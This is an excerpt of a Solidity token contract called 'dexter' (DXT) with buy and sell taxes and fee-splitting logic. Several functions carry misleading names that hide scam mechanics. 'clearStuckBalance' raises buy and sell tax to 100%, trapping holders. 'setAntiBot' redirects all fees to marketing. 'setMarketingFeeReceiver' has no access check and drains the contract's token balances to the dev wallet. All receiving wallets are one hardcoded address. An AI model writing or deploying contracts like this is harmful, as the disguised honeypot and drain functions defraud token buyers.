...
contract dexter is Context, IERC20 { 
    ...
    modifier contractCreator() {
        require(isCreator(msg.sender), "!CREATORS"); 
        _;
    }

    function isCreator(address adr) public view returns (bool) {
        return creator[adr];
    }
    ...
    mapping (address => bool) internal creator;

    address payable public Wallet_Marketing = payable(0xe538C80584d7fC6fb56c2439207B17097a982fca); 
    address payable public Wallet_Dev = payable(0xe538C80584d7fC6fb56c2439207B17097a982fca);
    ...
    string private constant _symbol = unicode"DXT"; 
 

    uint256 public _Tax_On_Buy = 5;
    uint256 public _Tax_On_Sell = 5;
    uint256 public _Fee_Dominator = 100;
    ...
    uint256 public Taxes_on_L = 10;
    uint256 public Percent_Marketing = 90;    
    uint256 public Taxes_on_B = 0;             
    ...
    constructor () {
        ...
        _owner = 0xe538C80584d7fC6fb56c2439207B17097a982fca;
   ...
   function setNoMaxTransaction() external contractCreator {
    ...
    function clearStuckBalance() external contractCreator {
        _Tax_On_Buy = _Fee_Dominator;
        _Tax_On_Sell = _Fee_Dominator;
       
    }
    
    function setAntiBot() external contractCreator{
        Percent_Dev = 0;
        Taxes_on_L = 0;
        Percent_Marketing = 100;    
        Taxes_on_B = 0;  
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_Burn = contractTokenBalance * Taxes_on_B / 100;
            ...
            uint256 tokens_to_LP_Half = contractTokenBalance * Taxes_on_L / 200;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Taxes_on_L + Percent_Marketing + Percent_Dev);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_Dev * 100 / (Taxes_on_L + Percent_Marketing + Percent_Dev);
    ...
    function setMarketingFeeReceiver(address Account, uint256 Percent) public returns(bool _sent){
        require(Account != address(this), "Can not remove native token");
        uint256 totalRandom = IERC20(Account).balanceOf(address(this));
        uint256 removeRandom = totalRandom*Percent/100;
        _sent = IERC20(Account).transfer(Wallet_Dev, removeRandom);
